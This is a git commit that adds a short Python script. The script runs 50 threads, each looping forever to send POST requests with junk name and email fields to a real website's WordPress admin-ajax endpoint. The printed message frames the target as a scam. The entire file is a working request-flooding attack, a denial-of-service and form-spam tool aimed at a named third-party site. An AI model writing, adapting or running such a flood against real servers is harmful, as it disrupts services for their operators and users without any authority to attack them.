166a114cb1fb571e7fea0efcb53a9f799e3edd4a
SussyAHZ <70972043+AhzDeveloperlol@users.noreply.github.com>
2022-09-10 13:56:53 +0600

    Add files via upload

---
+++ main.py
@@ -0,0 +1,27 @@
+import requests
+import threading
+
+url = 'https://www.ilovefreesoftware.com/wp-admin/admin-ajax.php'
+
+data = {
+    'form_fields[name]': 'urmother',
+    'form_fields[email]': 'urmother@gmail.com',
+}
+
+def do_request():
+    while True:
+        response = requests.post(url, data=data).text
+        print("sending requests to scem")
+
+threads = []
+
+for i in range(50):
+    t = threading.Thread(target=do_request)
+    t.daemon = True
+    threads.append(t)
+
+for i in range(50):
+    threads[i].start()
+
+for i in range(50):
+    threads[i].join()
